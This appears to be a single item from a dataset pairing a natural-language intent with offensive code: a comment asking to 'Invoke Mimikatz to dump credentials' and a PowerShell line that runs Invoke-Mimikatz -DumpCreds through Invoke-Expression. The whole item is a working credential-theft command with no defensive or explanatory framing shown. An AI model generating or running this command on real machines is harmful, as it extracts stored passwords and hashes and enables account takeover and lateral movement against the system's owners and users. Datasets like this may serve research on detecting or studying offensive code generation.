# Natural language intent:
# Invoke Mimikatz to dump credentials

$script = 'Invoke-Mimikatz -DumpCreds'; Invoke-Expression $script;
